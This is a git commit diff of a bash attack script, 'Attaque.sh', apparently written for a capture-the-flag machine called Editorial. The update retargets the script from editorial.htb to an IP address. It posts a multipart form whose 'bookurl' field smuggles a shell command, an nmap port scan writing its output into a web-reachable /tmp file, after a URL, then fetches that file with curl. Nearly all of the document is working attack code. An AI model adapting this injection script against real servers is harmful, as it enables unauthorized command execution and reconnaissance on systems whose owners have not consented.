45d99f4ffe1f54e50f353715314d35f94c7b9b53
Samantha <103853521+SamGr7415@users.noreply.github.com>
2024-07-19 03:32:22 +0200

    Update Attaque.sh

--- Attaque.sh
+++ Attaque.sh
@@ -1,28 +1,25 @@
 #!/bin/bash
 
 # Variables
-url="http://editorial.htb/upload-cover"
-result_url="http://editorial.htb/tmp/nmap_results.txt"
-payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1 > /tmp/nmap_results.txt"
+url="http://10.10.11.20/upload-cover"
+payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1 -oN /tmp/ssrf_scan_results.txt"
+result_url="http://10.10.11.20/tmp/ssrf_scan_results.txt"
 
 # Function to perform the SSRF attack
 perform_ssrf_attack() {
   echo "Performing SSRF attack..."
   response=$(curl -s -X POST "$url" \
-    -H "Host: editorial.htb" \
+    -H "Host: 10.10.11.20" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
     -H "Accept: */*" \
     -H "Accept-Language: en-US,en;q=0.5" \
     -H "Accept-Encoding: gzip, deflate, br" \
-    -H "Content-Type: multipart/form-data; boundary=---------------------------344841833123013796121821834300" \
-    -H "Origin: http://editorial.htb" \
-    -H "Connection: close" \
-    -H "Referer: http://editorial.htb/upload" \
-    --data-binary $'-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookfile"; filename="doc1"\r\nContent-Type: application/octet-stream\r\n\r\n(binary file content)\r\n-----------------------------344841833123013796121821834300--')
+    -H "Content-Type: multipart/form-data; boundary=---------------------------boundary" \
+    --data-binary $'-----------------------------boundary\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------boundary--')
   echo "SSRF attack performed. Response: $response"
 }
 
-# Function to monitor and fetch results
+# Function to fetch results
 fetch_results() {
   echo "Fetching results..."
   results=$(curl -s "$result_url")
